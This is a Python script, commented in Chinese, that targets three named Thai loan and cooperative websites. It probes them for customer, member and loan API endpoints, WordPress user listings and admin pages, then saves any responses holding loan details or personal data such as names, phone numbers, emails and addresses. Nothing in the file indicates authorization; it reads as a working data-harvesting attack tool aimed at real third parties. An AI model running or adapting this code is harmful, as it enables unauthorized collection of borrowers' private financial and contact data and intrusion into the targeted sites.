#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
快速贷款信息提取器 - 针对特定贷款API
Fast Loan Data Extractor - Targeting Specific Loan APIs
"""

import requests
import json
import time
from datetime import datetime

class FastLoanExtractor:
    def __init__(self):
        self.targets = [
            "https://mula-x.com",
            "https://peacoop.or.th",
            "https://ngoenmun.com"
        ]
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080"
        }
        self.session = requests.Session()
        self.session.verify = False
        
    def extract_loan_data(self):
        """快速提取贷款数据"""
        print("=== 快速贷款数据提取 ===")
        
        all_data = []
        
        for target in self.targets:
            print(f"\n目标: {target}")
            
            # 1. 测试主要API端点
            api_data = self.test_loan_apis(target)
            if api_data:
                all_data.extend(api_data)
                print(f"  ✅ API数据: {len(api_data)} 条")
            
            # 2. 测试WordPress REST API
            wp_data = self.test_wordpress_api(target)
            if wp_data:
                all_data.extend(wp_data)
                print(f"  ✅ WordPress数据: {len(wp_data)} 条")
            
            # 3. 测试管理员页面
            admin_data = self.test_admin_pages(target)
            if admin_data:
                all_data.extend(admin_data)
                print(f"  ✅ 管理页面数据: {len(admin_data)} 条")
        
        # 保存数据
        self.save_data(all_data)
        
        return all_data
    
    def test_loan_apis(self, target: str):
        """测试贷款API"""
        extracted = []
        
        # 关键API端点
        api_endpoints = [
            '/api/loan/list',
            '/api/loan/application',
            '/api/customer/list',
            '/api/member/list',
            '/loan/api',
            '/credit/api',
            '/application/api',
            '/wp-json/wp/v2/users',
            '/wp-json/wp/v2/posts'
        ]
        
        for endpoint in api_endpoints:
            try:
                url = target + endpoint
                response = self.session.get(url, proxies=self.proxies, timeout=5)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        
                        # 检查是否包含有用数据
                        if self.is_loan_related(data):
                            extracted.append({
                                'type': 'loan_api',
                                'target': target,
                                'endpoint': endpoint,
                                'data': data,
                                'timestamp': datetime.now().isoformat()
                            })
                    except:
                        # 非JSON响应
                        content = response.text
                        if any(keyword in content.lower() for keyword in ['loan', 'credit', 'customer', 'member']):
                            extracted.append({
                                'type': 'loan_api_text',
                                'target': target,
                                'endpoint': endpoint,
                                'content': content[:300],
                                'timestamp': datetime.now().isoformat()
                            })
                            
            except:
                continue
                
        return extracted
    
    def test_wordpress_api(self, target: str):
        """测试WordPress API"""
        extracted = []
        
        wp_endpoints = [
            '/wp-json/wp/v2/users',
            '/wp-json/wp/v2/posts',
            '/wp-json/wp/v2/pages',
            '/wp-json/wp/v2/comments'
        ]
        
        for endpoint in wp_endpoints:
            try:
                url = target + endpoint
                response = self.session.get(url, proxies=self.proxies, timeout=5)
                
                if response.status_code == 200:
                    data = response.json()
                    
                    if data and len(data) > 0:
                        extracted.append({
                            'type': 'wordpress_api',
                            'target': target,
                            'endpoint': endpoint,
                            'record_count': len(data),
                            'sample': data[:3] if isinstance(data, list) else data,
                            'timestamp': datetime.now().isoformat()
                        })
                        
            except:
                continue
                
        return extracted
    
    def test_admin_pages(self, target: str):
        """测试管理页面"""
        extracted = []
        
        admin_pages = [
            '/wp-admin/',
            '/admin/',
            '/administrator/',
            '/dashboard/',
            '/control/',
            '/manage/'
        ]
        
        for page in admin_pages:
            try:
                url = target + page
                response = self.session.get(url, proxies=self.proxies, timeout=5)
                
                if response.status_code == 200:
                    extracted.append({
                        'type': 'admin_page',
                        'target': target,
                        'page': page,
                        'accessible': True,
                        'timestamp': datetime.now().isoformat()
                    })
                    
            except:
                continue
                
        return extracted
    
    def is_loan_related(self, data: any) -> bool:
        """检查数据是否与贷款相关"""
        if isinstance(data, dict):
            data_str = str(data).lower()
        elif isinstance(data, list):
            data_str = str(data[:3]).lower()  # 检查前3项
        else:
            data_str = str(data).lower()
        
        loan_keywords = [
            'loan', 'credit', 'customer', 'member', 'application',
            'amount', 'interest', 'rate', 'term', 'repayment',
            'ชื่อ', 'เบอร์', 'โทร', 'อีเมล', 'ที่อยู่',  # 泰语关键词
            '金额', '利率', '期限', '还款'  # 中文关键词
        ]
        
        return any(keyword in data_str for keyword in loan_keywords)
    
    def save_data(self, data):
        """保存数据"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"FAST_LOAN_DATA_{timestamp}.json"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump({
                    'extraction_info': {
                        'timestamp': timestamp,
                        'targets': self.targets,
                        'total_records': len(data),
                        'data_types': list(set([item['type'] for item in data]))
                    },
                    'extracted_data': data
                }, f, ensure_ascii=False, indent=2)
            
            print(f"\n✅ 快速贷款数据已保存: {filename}")
            print(f"   总记录数: {len(data)} 条")
            
            # 显示数据摘要
            if data:
                print(f"\n📊 数据摘要:")
                for item in data[:5]:  # 显示前5条
                    print(f"  - {item['type']}: {item['target']}{item.get('endpoint', item.get('page', ''))}")
            
        except Exception as e:
            print(f"❌ 保存数据失败: {e}")

def main():
    """主函数"""
    extractor = FastLoanExtractor()
    data = extractor.extract_loan_data()
    
    if data:
        print(f"\n🎯 提取完成! 共获取 {len(data)} 条贷款相关数据")
        print("📁 数据文件: FAST_LOAN_DATA_*.json")
    else:
        print("\n❌ 未找到贷款数据")

if __name__ == "__main__":
    main()